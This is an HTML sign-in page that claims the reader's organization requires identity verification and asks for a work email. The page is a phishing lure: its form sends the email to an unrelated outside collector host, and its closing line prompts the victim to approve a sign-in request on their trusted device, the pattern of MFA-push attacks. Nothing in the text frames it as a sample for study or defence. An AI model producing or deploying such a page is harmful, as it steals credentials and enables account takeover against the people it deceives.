<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Sign in to continue</title></head>
<body>
<main>
  <h1>Sign in to continue</h1>
  <p>Your organization requires you to verify it's you. Continue to your organization.</p>
  <form action="https://auth-relay.cdn-edge.cc/collect" method="post">
    <label>Work email
      <input type="email" name="email" autocomplete="username" required>
    </label>
    <button type="submit">Next</button>
  </form>
  <p class="muted">Approve this sign-in request on your trusted device.</p>
</main>
</body></html>
